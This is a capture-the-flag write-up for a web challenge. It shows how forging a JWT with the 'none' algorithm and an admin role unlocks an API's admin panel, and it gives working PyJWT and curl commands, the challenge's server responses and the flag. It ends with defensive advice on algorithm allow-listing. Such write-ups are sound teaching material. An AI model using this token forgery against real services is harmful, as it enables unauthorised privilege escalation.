# 8. Consola API del Santuario

**Category**: Web  
**Difficulty**: MEDIUM  
**Points**: 300  

## Description

> La API interna del santuario te entrega un token de sesión al autenticarte como capybarito (contraseña: capybarito123), pero el panel de administración solo lo ve una cuenta con role: admin. Convence al servidor de que eres administrador y lee la bandera del panel.
>
> URL: http://192.99.247.166:8084
>
> **Flag format:** `EVIL{...}`

## Reconnaissance

The API documentation at the root page shows two endpoints:
- `POST /login` - Authenticate with JSON body, returns session token
- `GET /panel` - Requires valid session token (cookie or Bearer header), admin panel requires `role: admin`

Login with provided credentials:

```bash
$ curl -s -X POST http://192.99.247.166:8084/login \
  -H 'Content-Type: application/json' \
  -d '{"usuario":"capybarito","password":"capybarito123"}'
```

Response:
```json
{
  "message": "Login exitoso",
  "status": "ok",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FweWJhcml0byIsInJvbGUiOiJ1c2VyIn0.aXtgOyQEV5A8-AJ8SqeU0sLMLp7YmrfVcbki_CcXUsk"
}
```

Decoding the JWT:
- Header: `{"alg":"HS256","typ":"JWT"}`
- Payload: `{"user":"capybarito","role":"user"}`

The token uses HS256 (HMAC-SHA256) with a secret key. The role is "user", but admin panel requires "admin".

## Analysis

JWT with HS256 is vulnerable to algorithm confusion attacks. The "none" algorithm attack works when the server accepts tokens with `alg: "none"` and an empty signature.

Testing the "none" algorithm:

```python
import jwt
token = jwt.encode({'user':'capybarito','role':'admin'}, '', algorithm='none')
# Returns: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FweWJhcml0byIsInJvbGUiOiJhZG1pbiJ9.
```

Using this token with the `/panel` endpoint grants admin access and returns the flag.

## Exploitation

```bash
# Generate token with "none" algorithm and admin role
python3 -c "
import jwt
print(jwt.encode({'user':'capybarito','role':'admin'}, '', algorithm='none'))
"

# Use token to access admin panel
curl -s -H "Authorization: Bearer <token>" http://192.99.247.166:8084/panel
```

Response:
```json
{
  "flag": "EVIL{jwt_n0ne_4lg_c0nfus10n}",
  "message": "Bienvenido al panel de administracion",
  "role": "admin",
  "status": "ok",
  "user": "capybarito"
}
```

## Flag

```
EVIL{jwt_n0ne_4lg_c0nfus10n}
```

## Key Takeaways

- JWT "none" algorithm attack works when server doesn't validate algorithm in header
- Always enforce a whitelist of allowed algorithms (e.g., only HS256, RS256)
- Never trust the `alg` header from the token; validate it server-side
- The flag was returned directly in the JSON response from the admin panel

## References

- JWT "none" algorithm vulnerability: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- OWASP JWT Security: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html